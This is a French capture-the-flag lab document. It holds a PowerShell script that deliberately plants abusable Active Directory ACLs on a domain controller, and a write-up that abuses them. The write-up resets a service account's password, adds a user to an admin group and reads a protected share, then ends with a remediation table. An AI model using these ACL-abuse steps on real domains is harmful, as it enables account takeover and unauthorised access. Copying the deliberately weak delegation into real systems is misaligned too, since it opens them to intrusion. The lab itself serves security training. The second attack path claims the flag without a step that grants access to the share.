# Flag 3 — ACL Active Directory dangereuses

> **Technique :** ACL Abuse — GenericAll + ResetPassword
> **Machine de déploiement :** DC01
> **Machine d'exploitation :** WS01 ou WS02
> **Compte de départ :** `CTF\helpdesk1` / `Helpdesk@1234`
> **Difficulté :** Intermédiaire

---

## Déploiement

### Script — Flag3-ACL-AD.ps1

> [!warning] Lancer en PowerShell Admin sur DC01

```powershell
#Requires -RunAsAdministrator
Import-Module ActiveDirectory

$DomainDN = "DC=ctf,DC=local"

Write-Host "`n[FLAG 3] ACL Active Directory dangereuses" -ForegroundColor Cyan

# --- 1. ACE : helpdesk1 -> GenericAll sur LocalAdmins-WS01 ---
$groupDN     = (Get-ADGroup -Identity "LocalAdmins-WS01").DistinguishedName
$helpdeskSID = (Get-ADUser  -Identity "helpdesk1").SID

$acl = Get-Acl -Path "AD:\$groupDN"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $helpdeskSID,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($ace)
Set-Acl -Path "AD:\$groupDN" -AclObject $acl
Write-Host "  [+] GenericAll : helpdesk1 -> LocalAdmins-WS01" -ForegroundColor Green

# --- 2. ACE : helpdesk1 -> ResetPassword sur svc-backup ---
$svcDN     = (Get-ADUser -Identity "svc-backup").DistinguishedName
$resetGuid = [Guid]"00299570-246d-11d0-a768-00aa006e0529"

$acl2 = Get-Acl -Path "AD:\$svcDN"
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $helpdeskSID,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    $resetGuid,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
)
$acl2.AddAccessRule($ace2)
Set-Acl -Path "AD:\$svcDN" -AclObject $acl2
Write-Host "  [+] ResetPassword : helpdesk1 -> svc-backup" -ForegroundColor Green

# --- 3. Share \\DC01\Backups ---
# Deux niveaux de permissions :
#   - Permissions SMB  -> acces reseau
#   - Permissions NTFS -> acces dossier
# Les deux doivent autoriser svc-backup

$flagPath = "C:\Shares\Backups"
New-Item -ItemType Directory -Path $flagPath -Force | Out-Null

if (Get-SmbShare -Name "Backups" -ErrorAction SilentlyContinue) {
    Remove-SmbShare -Name "Backups" -Force
    Write-Host "  [~] Ancien share Backups supprime" -ForegroundColor Gray
}

# Creer le share
New-SmbShare -Name "Backups" -Path $flagPath | Out-Null

# Permissions SMB : autoriser svc-backup, revoquer Tout le monde via SID S-1-1-0
Grant-SmbShareAccess -Name "Backups" -AccountName "CTF\svc-backup" `
    -AccessRight Full -Force | Out-Null

# Revoquer "Tout le monde" / "Everyone" via SID universel S-1-1-0
# Compatible Windows FR et EN
$everyoneSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
$everyoneName = $everyoneSID.Translate([System.Security.Principal.NTAccount]).Value
Revoke-SmbShareAccess -Name "Backups" -AccountName $everyoneName `
    -Force -ErrorAction SilentlyContinue | Out-Null
Write-Host "  [+] Share SMB \\DC01\Backups : svc-backup=Full, Tout le monde=Revoque" -ForegroundColor Green

# Permissions NTFS via SIDs universels (compatible FR/EN)
$aclShare = Get-Acl $flagPath
$aclShare.SetAccessRuleProtection($true, $false)
$aclShare.Access | ForEach-Object { $aclShare.RemoveAccessRule($_) | Out-Null }
foreach ($sid in @("S-1-5-18", "S-1-5-32-544")) {
    $s = New-Object System.Security.Principal.SecurityIdentifier($sid)
    $aclShare.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
        $s, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
}
$aclShare.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "CTF\svc-backup", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
Set-Acl -Path $flagPath -AclObject $aclShare
Write-Host "  [+] ACL NTFS : svc-backup FullControl" -ForegroundColor Green

Set-Content "$flagPath\flag3.txt" -Value "FLAG{ad_acl_delegation_abuse}" -Encoding UTF8
Write-Host "  [+] flag3.txt cree dans $flagPath" -ForegroundColor Green

# --- 4. Verifications ---
Write-Host "`n  [*] ACL groupe LocalAdmins-WS01 :" -ForegroundColor Yellow
(Get-Acl "AD:\$groupDN").Access |
    Where-Object { $_.IdentityReference -match "helpdesk" } |
    Select-Object IdentityReference, ActiveDirectoryRights

Write-Host "`n  [*] ACL svc-backup :" -ForegroundColor Yellow
(Get-Acl "AD:\$svcDN").Access |
    Where-Object { $_.IdentityReference -match "helpdesk" } |
    Select-Object IdentityReference, ActiveDirectoryRights

Write-Host "`n  [*] Permissions SMB :" -ForegroundColor Yellow
Get-SmbShareAccess -Name "Backups"

Write-Host "`n  [*] Permissions NTFS :" -ForegroundColor Yellow
icacls $flagPath

Write-Host "`n  [*] Flag :" -ForegroundColor Yellow
Get-Content "$flagPath\flag3.txt"

Write-Host "`n[FLAG 3] DONE" -ForegroundColor Green
Write-Host "  SNAPSHOT : DC01 - Flag3 deploye" -ForegroundColor Yellow
```

---

### Vérification du déploiement

> [!warning] Depuis PowerShell Admin sur DC01

```powershell
# Permissions SMB
Get-SmbShareAccess -Name "Backups"
# Attendu :
#   CTF\svc-backup  Allow  Full
#   (Tout le monde absent)

# Permissions NTFS
icacls C:\Shares\Backups
# Attendu :
#   CTF\svc-backup:(OI)(CI)(F)
#   AUTORITE NT\Systeme:(OI)(CI)(F)
#   BUILTIN\Administrateurs:(OI)(CI)(F)

# Flag
Get-Content "C:\Shares\Backups\flag3.txt"
# Attendu : FLAG{ad_acl_delegation_abuse}
```

> [!success] Snapshot DC01
> **`DC01 — Flag3 déployé`**

---

## Write-up

### Contexte

Le compte `helpdesk1` possède deux droits dangereux sur des objets Active Directory, mal configurés lors d'une délégation helpdesk. Ces droits permettent de prendre le contrôle de comptes et de groupes sans être administrateur du domaine :

- `GenericAll` sur le groupe `LocalAdmins-WS01` → peut y ajouter n'importe quel membre
- `ResetPassword` sur le compte `svc-backup` → peut changer son mot de passe sans connaître l'ancien

Le compte `svc-backup` est le seul à pouvoir accéder au share `\\DC01\Backups` qui contient le flag.

---

### Reconnaissance

#### Étape 1 — Énumérer les ACL AD avec les outils natifs

Connecté en `CTF\helpdesk1` sur WS01, ouvrir PowerShell :

```powershell
# Verifier les droits sur le groupe LocalAdmins-WS01
$groupDN = (Get-ADGroup -Identity "LocalAdmins-WS01").DistinguishedName
(Get-Acl "AD:\$groupDN").Access |
    Where-Object { $_.IdentityReference -match "helpdesk1" } |
    Select-Object IdentityReference, ActiveDirectoryRights
```

**Résultat :**

```
IdentityReference  ActiveDirectoryRights
-----------------  ---------------------
CTF\helpdesk1      GenericAll
```

```powershell
# Verifier les droits sur svc-backup
$svcDN = (Get-ADUser -Identity "svc-backup").DistinguishedName
(Get-Acl "AD:\$svcDN").Access |
    Where-Object { $_.IdentityReference -match "helpdesk1" } |
    Select-Object IdentityReference, ActiveDirectoryRights
```

**Résultat :**

```
IdentityReference  ActiveDirectoryRights
-----------------  ---------------------
CTF\helpdesk1      ExtendedRight
```

`ExtendedRight` avec le GUID `00299570-246d-11d0-a768-00aa006e0529` correspond au droit `ResetPassword`.

#### Étape 2 — Identifier le share cible

```powershell
net view \\DC01
```

**Résultat :**

```
Ressources partagées sur \\DC01

Nom du partage  Type  Commentaire
-----------------------------------------------------------------
Backups         Disque
NETLOGON        Disque
SYSVOL          Disque
```

Le share `Backups` est visible. On tente d'y accéder directement avec `helpdesk1` :

```powershell
net use B: \\DC01\Backups
# Résultat : Erreur système 5 — Accès refusé
```

Le share n'est accessible que par `svc-backup`. Il faut trouver un moyen d'obtenir ses credentials.

---

### Exploitation — Voie A : ResetPassword sur svc-backup

C'est le chemin le plus direct vers le flag.

#### Étape 3 — Réinitialiser le mot de passe de svc-backup

```powershell
$newPwd = ConvertTo-SecureString "Hacked@99!" -AsPlainText -Force
Set-ADAccountPassword -Identity "svc-backup" -NewPassword $newPwd -Reset
Write-Host "Mot de passe de svc-backup reinitialise : Hacked@99!"
```

#### Étape 4 — Accéder au share et lire le flag

```powershell
net use B: \\DC01\Backups /user:CTF\svc-backup Hacked@99!
Get-Content B:\flag3.txt
net use B: /delete
```

**Résultat :**

```
FLAG{ad_acl_delegation_abuse}
```

---

### Exploitation — Voie B : GenericAll sur LocalAdmins-WS01

Cette voie donne les droits admin locaux sur WS01.

#### Étape 3 — S'ajouter au groupe LocalAdmins-WS01

```powershell
Add-ADGroupMember -Identity "LocalAdmins-WS01" -Members "helpdesk1"
```

#### Étape 4 — Vérifier l'ajout

```powershell
Get-ADGroupMember -Identity "LocalAdmins-WS01" | Select-Object Name
```

**Résultat :**

```
Name
----
svc-web
helpdesk1
```

#### Étape 5 — Obtenir un nouveau token

Se déconnecter et se reconnecter avec `helpdesk1`. Le compte est maintenant admin local sur WS01.

---

### Récupération du flag

```powershell
Get-Content B:\flag3.txt
```

**Résultat :**

```
FLAG{ad_acl_delegation_abuse}
```

---

### Aller plus loin

```powershell
# Ajouter lowpriv au groupe admin local
Add-ADGroupMember -Identity "LocalAdmins-WS01" -Members "lowpriv"

# Pivoter vers d'autres ressources de svc-backup
net use B: \\DC01\Backups /user:CTF\svc-backup Hacked@99!
```

---

### Remédiation

| Problème | Correction |
|---|---|
| `GenericAll` accordé à helpdesk1 | Remplacer par des droits granulaires — uniquement `WriteMembers` si nécessaire |
| `ResetPassword` accordé à helpdesk1 | Déléguer uniquement aux comptes qui en ont un besoin opérationnel réel |
| Pas d'audit des ACL | Auditer régulièrement avec BloodHound ou `Get-ObjectAcl` |
| Pas d'alerting | Alertes sur les modifications de membres de groupes sensibles |

---

### Résumé de la chaîne d'exploitation

```
helpdesk1
  └─→ Get-Acl AD:\LocalAdmins-WS01 → GenericAll sur le groupe
  │     └─→ Add-ADGroupMember → helpdesk1 admin local WS01
  │
  └─→ Get-Acl AD:\svc-backup → ExtendedRight (ResetPassword)  ← chemin direct
        └─→ Set-ADAccountPassword → nouveau mot de passe svc-backup
              └─→ net use \\DC01\Backups /user:CTF\svc-backup Hacked@99!
                    └─→ FLAG{ad_acl_delegation_abuse}
```
